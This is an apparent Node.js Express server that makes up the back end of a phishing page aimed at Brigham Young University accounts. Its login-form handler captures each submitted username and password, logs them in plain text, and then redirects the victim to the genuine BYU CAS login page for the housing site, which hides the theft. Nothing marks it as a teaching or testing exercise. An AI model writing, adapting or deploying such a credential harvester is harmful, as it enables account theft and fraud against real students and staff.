const express = require("express")
const bodyparser = require("body-parser")

const app = express()
const cors = require("cors")

app.use(cors())
app.use(bodyparser.json())
app.use(
  bodyparser.urlencoded({
    extended: true,
  })
)
app.use(express.urlencoded())
app.use(express.json())
app.use(express.static("public"))

const port = process.env.PORT || 3000

app.get("/", (req, res) => {
  res.sendFile("./index.html", { root: "public/static" })
})

app.post("/loginform", (req, res) => {
  const formdata = req.body
  const username = formdata.username
  const password = formdata.password
  console.log("Username:", username)
  console.log("Password:", password)
  res.redirect(
    "https://cas.byu.edu/cas/login?service=https://housing.byu.edu/secure/services/c_main/login.aspx?r=/secure/services/c_main/default.aspx"
  )
})

app.listen(port, () => {
  console.log(`Server is running on port ${port}`)
})
